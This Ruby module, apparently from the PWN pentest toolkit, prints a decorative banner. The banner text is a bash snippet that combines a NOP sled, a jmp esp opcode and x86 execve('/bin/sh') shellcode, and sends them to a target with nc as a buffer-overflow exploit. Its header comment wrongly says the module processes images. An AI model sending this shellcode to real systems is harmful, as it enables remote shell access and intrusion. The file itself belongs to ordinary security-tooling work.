# frozen_string_literal: true

require 'colorize'

module PWN
  module Banner
    # This plugin processes images into readable text
    module JmpEsp
      # Supported Method Parameters::
      # PWN::Banner::JmpEsp.get

      public_class_method def self.get
        '
        #!/bin/bash
        nop=$(printf \'\x90%.0s\' {1..1337})
        asm_ops=\'\xff\xe4\'
        payload=\'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb8\x0b\x00\x00\x00\xcd\x80\'
        pwn="${nop}${asm_ops}${payload}"
        echo -en $pwn | nc $TARGET $PORT
        '.red
      rescue StandardError => e
        raise e
      end

      # Author(s):: 0day Inc. <request.pentest@0dayinc.com>

      public_class_method def self.authors
        "AUTHOR(S):
          0day Inc. <request.pentest@0dayinc.com>
        "
      end

      # Display Usage for this Module

      public_class_method def self.help
        puts "USAGE:
          #{self}.get

          #{self}.authors
        "
      end
    end
  end
end
